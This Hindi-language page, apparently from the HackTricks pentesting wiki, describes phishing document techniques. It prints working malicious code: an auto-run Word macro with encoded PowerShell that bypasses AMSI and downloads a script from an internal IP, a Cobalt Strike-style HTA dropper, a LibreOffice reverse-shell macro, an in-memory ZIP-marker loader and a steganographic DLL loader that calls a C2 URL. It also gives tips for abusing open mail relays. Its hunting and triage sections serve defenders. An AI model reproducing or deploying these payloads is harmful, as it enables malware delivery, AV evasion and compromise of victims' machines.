# Phishing फ़ाइलें और दस्तावेज़

{{#include ../../banners/hacktricks-training.md}}

## Office दस्तावेज़

Microsoft Word फ़ाइल खोलने से पहले फ़ाइल के डेटा का validation करता है। डेटा validation, OfficeOpenXML standard के अनुसार डेटा संरचना की पहचान के रूप में किया जाता है। डेटा संरचना की पहचान के दौरान कोई त्रुटि होने पर, विश्लेषण की जा रही फ़ाइल नहीं खुलेगी।

आमतौर पर, macros वाली Word फ़ाइलों में `.docm` extension का उपयोग होता है। हालांकि, फ़ाइल extension बदलकर फ़ाइल का नाम बदलना संभव है और फिर भी उसकी macro execution क्षमताएं बनी रहती हैं।\
उदाहरण के लिए, डिज़ाइन के अनुसार RTF फ़ाइल macros को support नहीं करती, लेकिन RTF में rename की गई DOCM फ़ाइल को Microsoft Word संभालेगा और उसमें macro execution संभव होगा।\
यही internals और mechanisms Microsoft Office Suite के सभी software (Excel, PowerPoint आदि) पर लागू होते हैं।

कुछ Office programs में कौन-से extensions execute होंगे, यह जांचने के लिए आप निम्न command का उपयोग कर सकते हैं:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX फ़ाइलें, जो macros वाले remote template (File –Options –Add-ins –Manage: Templates –Go) का संदर्भ देती हैं, macros को “execute” भी कर सकती हैं।

### External Image Load

यहाँ जाएँ: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: यहाँ जाएँ: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

किसी प्राप्त document को बनाने के बजाय उसका विश्लेषण करने के लिए, देखें [VBA macro analysis: junk code and UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Macros Backdoor

Macros का इस्तेमाल करके document से मनमाना code चलाना संभव है।

#### Autoload functions

जितने अधिक आम ये होते हैं, AV द्वारा उनका पता लगाए जाने की संभावना उतनी ही अधिक होती है।

- AutoOpen()
- Document_Open()

#### Macros Code Examples

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### मेटाडेटा मैन्युअल रूप से हटाएं

**File > Info > Inspect Document > Inspect Document** पर जाएं। इससे Document Inspector खुलेगा। **Inspect** पर क्लिक करें और फिर **Document Properties and Personal Information** के बगल में **Remove All** पर क्लिक करें।

#### Doc Extension

पूरा होने पर, **Save as type** ड्रॉपडाउन चुनें और फ़ॉर्मैट को **`.docx`** से **Word 97-2003 `.doc`** में बदलें।\
ऐसा इसलिए करें क्योंकि आप **`.docx` में macro सेव नहीं कर सकते** और macro-सक्षम **`.docm`** extension को लेकर **एक कलंक** है (उदाहरण के लिए, उसके thumbnail icon पर बड़ा `!` होता है और कुछ web/email gateway उन्हें पूरी तरह ब्लॉक कर देते हैं)। इसलिए, यह **पुराना `.doc` extension सबसे अच्छा समझौता है**।

#### Malicious Macros Generators

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer दस्तावेज़ों में Basic macros एम्बेड किए जा सकते हैं और macro को **Open Document** event से जोड़कर फ़ाइल खुलने पर उन्हें अपने-आप चलाया जा सकता है (Tools → Customize → Events → Open Document → Macro…)।<sup>[[1]](#references)</sup> एक साधारण reverse shell macro इस तरह दिखता है:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

ध्यान दें कि string के अंदर doubled quotes (`""`) हैं—LibreOffice Basic literal quotes को escape करने के लिए इनका उपयोग करता है, इसलिए `...==""")` पर समाप्त होने वाले payloads में inner command और Shell argument, दोनों के quotes संतुलित रहते हैं।

डिलीवरी टिप्स:

- `.odt` के रूप में सेव करें और macro को document event से bind करें, ताकि document खुलते ही वह execute हो।
- `swaks` से email भेजते समय `--attach @resume.odt` का उपयोग करें (`@` आवश्यक है, ताकि attachment के रूप में filename string नहीं, बल्कि file के bytes भेजे जाएँ)। यह उन SMTP servers का दुरुपयोग करते समय महत्वपूर्ण है जो validation के बिना मनमाने `RCPT TO` recipients स्वीकार करते हैं।

## HTA Files

HTA एक Windows program है जो **HTML और scripting languages (जैसे VBScript और JScript) को मिलाता है**। यह user interface बनाता है और browser के security model की पाबंदियों के बिना, एक "fully trusted" application के रूप में execute होता है।

HTA को **`mshta.exe`** से execute किया जाता है, जो आम तौर पर **Internet Explorer** के साथ **installed** होता है; इसलिए **`mshta`, IE पर निर्भर है**। अगर IE uninstall कर दिया गया हो, तो HTAs execute नहीं हो पाएँगे।

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## HTML ईमेल में नकली अटैचमेंट कार्ड

HTML ईमेल में असली अटैचमेंट भेजने के बजाय, किसी provider के native attachment-preview card की नकल की जा सकती है। Talos ने चार Base64-encoded inline PNG MIME parts से दोबारा बनाया गया Gmail card देखा। पूरा visual control एक anchor के भीतर रखा गया था, और `?m=<target-id>` में recipient value से प्रति-recipient tracking संभव थी। लिंक `http://` या `https://` के बजाय `//` से शुरू होता था; ब्राउज़र इस protocol-relative रूप को resolve कर लेते हैं, लेकिन केवल पूरी तरह qualified URLs से match करने वाले URL extractors इसे नहीं ढूँढ़ पाते।<sup>[[11]](#references)</sup>

विश्लेषण के दौरान, render की गई attachment list पर भरोसा करने के बजाय raw MIME की जाँच करें। पता लगाएँ कि inline image parts मिलकर visual card कैसे बनाते हैं, उसे घेरने वाले anchor की पहचान करें, और URL निकालने से पहले protocol-relative `href` values को normalize करें।<sup>[[11]](#references)</sup>

Envelope/header sender spoofing और DMARC alignment testing के लिए, [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender) देखें।

## NTLM Authentication को बाध्य करना

**दूर से NTLM authentication को बाध्य** करने के कई तरीके हैं। उदाहरण के लिए, आप ईमेल या उस HTML में **अदृश्य images** जोड़ सकते हैं जिसे उपयोगकर्ता खोलेगा (HTTP MitM के ज़रिए भी?)। या पीड़ित को **ऐसी files के पते** भेज सकते हैं जो **folder खोलते ही** authentication **trigger** करें।

**इन और अन्य विचारों को निम्नलिखित पेजों पर देखें:**

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

यह न भूलें कि आप केवल hash या authentication चुरा ही नहीं सकते, बल्कि **NTLM relay attacks भी कर सकते हैं**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

बेहद प्रभावी campaigns में ऐसी ZIP भेजी जाती है जिसमें दो वैध decoy documents (PDF/DOCX) और एक malicious .lnk होता है। तरकीब यह है कि असली PowerShell loader, ZIP के raw bytes में एक unique marker के बाद रखा जाता है, और .lnk उसे निकालकर पूरी तरह memory में चलाता है।<sup>[[2]](#references)</sup>

.lnk द्वारा लागू किए गए PowerShell one-liner का सामान्य flow:

1) आम paths में original ZIP ढूँढ़ें: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, और current working directory के parent में।
2) ZIP bytes पढ़ें और hardcoded marker (जैसे, xFIQCV) ढूँढ़ें। Marker के बाद का सारा डेटा embedded PowerShell payload होता है।
3) ZIP को %ProgramData% में copy करें, वहीं extract करें, और वैध दिखने के लिए decoy .docx खोलें।
4) मौजूदा process के लिए AMSI bypass करें: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) अगली stage को deobfuscate करें (जैसे, सभी # characters हटाएँ) और उसे memory में execute करें।

Embedded stage को निकालकर चलाने के लिए PowerShell skeleton का उदाहरण:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

नोट्स
- Delivery में अक्सर प्रतिष्ठित PaaS subdomains (जैसे, *.herokuapp.com) का दुरुपयोग किया जाता है और payloads को gate किया जा सकता है (IP/UA के आधार पर benign ZIPs serve करना)।
- अगला stage अक्सर base64/XOR shellcode को decrypt करता है और disk artifacts कम करने के लिए उसे Reflection.Emit + VirtualAlloc के ज़रिए execute करता है।

इसी chain में इस्तेमाल किया गया Persistence
- Microsoft Web Browser control का COM TypeLib hijacking, ताकि IE/Explorer या इसे embed करने वाला कोई भी app payload को अपने-आप फिर से launch करे।<sup>[[2]](#references)[[4]](#references)</sup> विवरण और इस्तेमाल के लिए तैयार commands यहाँ देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ऐसी ZIP files जिनमें archive data के अंत में ASCII marker string (जैसे, xFIQCV) जोड़ी गई हो।
- ऐसी .lnk जो ZIP खोजने के लिए parent/user folders की सूची देखती है और एक decoy document खोलती है।
- [System.Management.Automation.AmsiUtils]::amsiInitFailed के ज़रिए AMSI tampering।
- लंबे समय तक चलने वाले business threads, जो trusted PaaS domains पर hosted links के साथ समाप्त होते हैं।

## LNK पहले decoy खोलकर staging → scheduled-task persistence → trusted CPL side-loading

एक और बार-बार दिखने वाला pattern है **document का रूप धारण करने वाली `.lnk`**, जो background में असली chain तैयार करते हुए तुरंत एक benign lure खोलती है।<sup>[[3]](#references)</sup>

देखा गया workflow:
1. Shortcut **PDF का रूप धारण करता है** और obfuscated PowerShell downloader चलाने के लिए `conhost.exe` या किसी समान proxy का इस्तेमाल करता है।
2. PowerShell स्पष्ट tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) के बीच fragments डालता है, ताकि `iwr`, `gci`, `ren`, `cpi` या `schtasks` खोजने वाले naive detections command को पकड़ न पाएं।
3. Stager पहले **decoy document download** करता है, उसे victim के लिए खोलता है, और फिर background में malicious files को दोबारा तैयार करता है।
4. Payloads को **junk extensions** के साथ लिखा जा सकता है और फिर filler characters हटाकर उनका नाम बदला जा सकता है, जिससे स्पष्ट `.exe` / `.cpl` artifacts देर से दिखाई देते हैं।
5. Persistence एक **मिनट के अंतराल पर चलने वाले scheduled task** से स्थापित होता है, जो user-writable path से trusted host binary launch करता है।

इस pattern के कुछ बुनियादी hunting clues:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

पहचानने योग्य एक उपयोगी staging layout:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` या `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### दूसरा stage stealthy क्यों है

Rapid7 case study में, scheduled task ने बार-बार `C:\Users\Public\` से **`Fondue.exe`** launch किया। क्योंकि **`APPWIZ.cpl`** को इसके साथ ही stage किया गया था और उसने **`RunFODW`** export किया था, इसलिए trusted Microsoft binary ने वैध system copy के बजाय attacker CPL को side-load किया।

इसके बाद CPL:
- `C:\Windows\Tasks\editor.dat` से **AES-256-CBC** blob पढ़ता है
- **Windows CNG / `bcrypt.dll`** के ज़रिए उसे decrypt करता है
- Executable memory allocate करता है और decrypted shellcode को उसमें copy करता है
- **`EnumUILanguagesW`** के callback के रूप में shellcode pointer पास करके उसे अप्रत्यक्ष रूप से execute करता है

आखिरी चरण को अलग से hunt करना उपयोगी है: malware अक्सर सीधे `((void(*)())buf)()` jump से बचता है और execution transfer करने के लिए इसके बजाय **वैध callback-taking WinAPI** का दुरुपयोग करता है।

इस campaign में decrypted payload **Donut** shellcode था, जिसने फिर final PE को पूरी तरह memory में map किया और execution सौंपने से पहले मौजूदा process में **AMSI/WLDP/ETW** को patch किया। Side-loading और memory-resident post-processing पर अधिक जानकारी के लिए देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Hunting के लिए व्यावहारिक संकेत:
- `.lnk` द्वारा `powershell.exe` या `conhost.exe` को spawn करना, जिसके बाद एक दिखाई देने वाला decoy document खुले।
- **`C:\Users\Public\`** में थोड़े समय के लिए downloads होना, जिसके तुरंत बाद nonsense extensions से rename किया जाना।
- `GoogleErrorReport` जैसे साधारण नामों वाले scheduled tasks, जो **user-writable directories** से execute होते हों।
- Trusted binaries का उसी non-system directory से **`.cpl` / `.dll`** files load करना।
- **`C:\Windows\Tasks\`** के अंतर्गत लिखे गए Base64 text blobs, जिन्हें बाद में side-loaded module पढ़े।

## Images में steganography-delimited payloads (PowerShell stager)

हाल की loader chains एक obfuscated JavaScript/VBS deliver करती हैं, जो Base64 PowerShell stager को decode करके चलाती है। वह stager एक image (अक्सर GIF) download करता है, जिसमें plain text के रूप में unique start/end markers के बीच छिपी हुई Base64-encoded .NET DLL होती है। Script इन delimiters को खोजती है (जंगल में देखे गए उदाहरण: «<<sudo_png>> … <<sudo_odt>>>»), उनके बीच का text निकालती है, उसे Base64 से bytes में decode करती है, assembly को memory में load करती है और C2 URL के साथ एक ज्ञात entry method invoke करती है।<sup>[[5]](#references)</sup>

Workflow
- Stage 1: Archived JS/VBS dropper → embedded Base64 को decode करता है → `-nop -w hidden -ep bypass` के साथ PowerShell stager launch करता है।
- Stage 2: PowerShell stager → image download करता है, marker-delimited Base64 निकालता है, .NET DLL को memory में load करता है और C2 URL व options पास करके उसका method (जैसे, VAI) call करता है।
- Stage 3: Loader final payload retrieve करता है और आमतौर पर उसे process hollowing के ज़रिए किसी trusted binary (अक्सर MSBuild.exe) में inject करता है।<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing और trusted utility proxy execution के बारे में यहाँ और जानें:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Image से DLL निकालने और memory में .NET method invoke करने का PowerShell उदाहरण:

<details>
<summary>PowerShell stego payload extractor and loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

नोट्स
- यह ATT&CK T1027.003 (steganography/marker-hiding) है।<sup>[[6]](#references)</sup> Markers अलग-अलग campaigns में अलग होते हैं।
- Assembly लोड करने से पहले आम तौर पर AMSI/ETW bypass और string deobfuscation किए जाते हैं।
- Hunting: डाउनलोड की गई images को ज्ञात delimiters के लिए scan करें; ऐसी PowerShell गतिविधि पहचानें जो images को access करके तुरंत Base64 blobs decode करती है।

stego tools और carving techniques भी देखें:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

एक बार-बार दिखने वाला शुरुआती stage एक छोटी, बहुत अधिक obfuscated `.js` या `.vbs` file होती है, जिसे archive के अंदर भेजा जाता है। इसका एकमात्र उद्देश्य embedded Base64 string को decode करना और अगले stage को HTTPS पर bootstrap करने के लिए `-nop -w hidden -ep bypass` के साथ PowerShell लॉन्च करना है।<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- अपनी file के contents पढ़ें
- junk strings के बीच Base64 blob खोजें
- उसे ASCII PowerShell में decode करें
- `wscript.exe`/`cscript.exe` से `powershell.exe` invoke करके execute करें

Hunting संकेत
- Archived JS/VBS attachments, जिनसे command line में `-enc`/`FromBase64String` के साथ `powershell.exe` launch होता है।
- User temp paths से `wscript.exe` द्वारा `powershell.exe -nop -w hidden` लॉन्च करना।

## Execution containers के रूप में MSC documents (GrimResource)

Microsoft Management Console files (`.msc`) XML console definitions होती हैं, जिन्हें आम तौर पर `mmc.exe` खोलता है। **GrimResource**, पुराने XSS primitive वाले `apds.dll` resource के `StringTable` reference का दुरुपयोग करता है, ताकि crafted console खोलने पर JavaScript `mmc.exe` के अंदर run हो। देखे गए samples में `transformNode`-आधारित obfuscation को **DotNetToJScript** के साथ जोड़कर, सामान्य Office-macro path के बिना .NET payload instantiate किया गया।<sup>[[9]](#references)</sup>

Static triage के लिए, किसी untrusted MSC को text के रूप में देखें और उसे **double-click न करें**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

High-signal runtime pivots में `mmc.exe` का CLR या script components लोड करना, network connections बनाना, या `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` अथवा किसी अप्रत्याशित executable को spawn करना शामिल है। यह format वैध है, इसलिए detections को हर MSC को block करने के बजाय **origin + संदिग्ध XML/script content + `mmc.exe` के व्यवहार** को correlate करना चाहिए।<sup>[[9]](#references)</sup>

## PDF/QR redirectors और payload gating

किसी PDF का उपयोगी होने के लिए उसमें exploit होना ज़रूरी नहीं है। हाल के campaigns में सामान्य दिखने वाले document में **QR code या साधारण link** रखा जाता है, browser session को mail controls से दूर ले जाया जाता है और recipient address के अनुसार destination को personalize किया जाता है। Microsoft ने 2025 में ऐसे PDFs का दस्तावेज़ीकरण किया जिनके QR URLs हर recipient के लिए अलग थे और वे RaccoonO365 credential-harvesting infrastructure तक ले जाते थे; एक समानांतर chain में IP/environment gating का उपयोग करके चुने हुए visitors को JavaScript/MSI path दिया जाता था, जबकि scanners या अनुमति न दिए गए clients को benign PDF मिलता था।<sup>[[10]](#references)</sup>

PDF actions और render किए गए QR codes—दोनों की triage करें। QR को extractable image के रूप में store करने के बजाय vector-drawn किया जा सकता है, इसलिए embedded images extract करने के साथ-साथ हर page को rasterize करें:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

एक isolated analysis system से authenticate किए बिना decoded destinations और redirects का निरीक्षण करें। उपयोगी hunting features में लगभग खाली mail bodies वाले QR-only PDFs, query parameter में embedded recipient email, प्रतिष्ठित hosting सेवाओं से होकर कई redirects, और IP, geolocation, cookies, referrer या user agent के अनुसार लौटाई जाने वाली अलग-अलग content शामिल हैं। नियंत्रित profiles के साथ requests की तुलना करें, क्योंकि एक sandbox fetch को केवल decoy मिल सकता है।<sup>[[10]](#references)</sup>

## NTLM hashes चुराने के लिए Windows files

**NTLM creds चुराने के स्थान** वाला पेज देखें:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: अमेरिकी कंपनियों को निशाना बनाने वाला एक परिष्कृत Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: China-themed Loader Chain के ज़रिए Dropping Elephant की Tradecraft को ट्रैक करना](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – नई COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader कई तरह के Infostealers पहुँचाता है](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Initial access और evasion के लिए Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Threat actors tax-themed phishing campaigns deploy करने के लिए tax season का फ़ायदा उठाते हैं](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587 delivery chain और Antino backdoor](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
